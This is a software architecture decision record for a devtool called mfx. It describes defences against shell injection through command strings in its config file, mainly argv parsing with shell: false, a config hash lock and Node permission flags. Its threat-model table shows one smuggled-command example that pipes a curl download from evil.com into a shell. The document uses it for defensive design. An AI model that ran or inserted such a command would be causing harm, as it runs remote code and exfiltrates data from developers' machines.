# ADR-0001 — Command Trust Boundary in mfx.config.json

* **Status:** accepted
* **Deciders:** EKOU Solutions
* **Date:** 2026-06-29

---

## Context and Problem Statement

`mfx.config.json` contains command strings (e.g. `"dev": "vite --port 5173"`) that
`mfx` executes as subprocesses at startup. Without any controls, a tampered or
maliciously crafted config can run arbitrary code with the full privileges of the
developer's user account.

**Relevant attack vectors:**

| Vector | Example |
|---|---|
| Malicious PR | `"dev": "vite & curl https://evil.com/exfil \| sh"` looks like a minor config change |
| Supply chain | A compromised npm postinstall hook writes to `mfx.config.json` |
| Shared machine | A config from an untrusted source is run without review |

The tool is a local devtool — it runs on developer machines, not in production.
The threat is real but moderate: the config is typically in git (visible history),
but command-section changes can go unreviewed in noisy PRs.

---

## Decision Drivers

- Zero shell injection: the most reliable fix is structural, not pattern-matching.
- Low friction for legitimate use: standard dev server commands (`vite`, `webpack`, `nx`) must work without changes.
- v1-feasible: no experimental dependencies that could break across Node versions.
- Auditable: changes to dangerous config sections must surface to the developer.

---

## Considered Options

### Option A — `shell: true` (current implicit default, no controls)

Pass the raw command string to `child_process.spawn` with `shell: true`.

- Good: maximum flexibility, user can use pipes and shell operators.
- Bad: any shell metacharacter in the config is executed — direct injection path.
- Bad: no audit trail for config changes.

### Option B — structural validation + `shell: false` ✓ chosen

Parse the command string into `[bin, ...args]` using an argv parser and call
`spawn(bin, args, { shell: false })`. Reject at config-parse time any string that
contains shell metacharacters (`;`, `&`, `|`, `$`, `` ` ``, `>`, `<`).

- Good: shell injection is structurally impossible — the shell is never invoked.
- Good: aligns with standard Node.js security guidance.
- Neutral: user cannot use pipes/redirects in the config directly; they must wrap
  in an npm script or shell script. This is an acceptable trade-off for a devtool.
- Bad: requires an argv parser in `packages/core` (hand-rolled to keep zero deps).

### Option C — allowlist of permitted binaries

Only allow a predefined set of binaries (`vite`, `webpack`, `nx`, `ng`, etc.).

- Good: very tight restriction.
- Bad: breaks any custom command and requires constant maintenance as the ecosystem evolves.
- Rejected: too restrictive for a general-purpose devtool.

---

## Decision Outcome

**Chosen: Option B — structural validation + `spawn` with `shell: false`.**

Supplemented by two additional layers:

### Layer 1 — `spawn` with `shell: false` (primary)

At config load time, every command string is parsed into `[binary, ...args]`.
Shell metacharacters are rejected with a clear, actionable error.

```
ConfigError: command "app-shell.dev" contains disallowed characters: &
  Commands must be plain executable + arguments (e.g. "vite --port 5173").
  To use shell operators, wrap the command in an npm script and reference it:
    "dev": "npm run dev:app-shell"
```

The subprocess is then started as:

```typescript
spawn(binary, args, { shell: false, env: process.env })
```

### Layer 2 — Config integrity hash (audit trail)

On startup, `mfx` computes a SHA-256 of the `commands` section of
`mfx.config.json`. The hash is stored in `.mfx/config.lock` (gitignored,
machine-local).

- **First run / file not found:** hash is written silently, no prompt.
- **Hash matches:** startup proceeds normally.
- **Hash mismatch:** `mfx` pauses, displays a diff of which command strings
  changed, and asks for explicit confirmation before continuing:

```
⚠  mfx.config.json commands changed since last run:

  app-shell
    dev:  "vite --port 5173"  →  "vite --port 5180"

  host-app
    dev:  [new]  →  "vite --port 5200"

Continue with updated commands? [y/N]
```

Answering `y` updates the lock file. Answering `N` exits without running anything.

### Layer 3 — Node.js Permission Model (runtime sandbox for the mfx process)

`mfx` itself is launched with Node.js permission constraints so that the mfx process
cannot access arbitrary paths or do unexpected things beyond its declared scope:

| Permission | Scope |
|---|---|
| `--allow-fs-read` | Project directory (cwd) |
| `--allow-fs-write` | `.mfx/` directory only |
| `--allow-child-process` | Required to spawn MFE dev servers |
| `--allow-env` | Allowed (dev servers need environment variables) |

This is applied via a thin wrapper script in `apps/mfx-cli/bin/mfx` (the npm
binary entry point).

> **Note:** the Permission Model (`--permission`) became unflagged in Node.js 22.
> The `--experimental-permission` alias (Node 20) is also supported. Minimum
> Node.js version for `mfx` is set to 20 LTS.

This layer sandboxes **the mfx process**, not the child processes it spawns.
Child processes (e.g. Vite, webpack) run under the operating system's normal
permission model for the user. Future versions may add per-MFE restrictions.

---

## Positive Consequences

- Shell injection via `mfx.config.json` is structurally impossible in v1.
- Developers are automatically alerted when command definitions change.
- The mfx process itself cannot access files outside its declared scope.

## Negative Consequences

- Users with legitimate pipe-based commands (`tsc --watch | prettier --stdin`) must
  refactor them into npm scripts. Error message provides clear guidance.
- The `.mfx/config.lock` file must be added to `.gitignore`; `mfx init` and `eject`
  handle this automatically.
- Node.js ≥ 20 is required (already aligned with team's tooling baseline).

---

## See also

- [requirements.md](../requirements.md) — FR-15, FR-16, FR-17
- [architecture.md](../architecture.md) — §Decision: command trust boundary
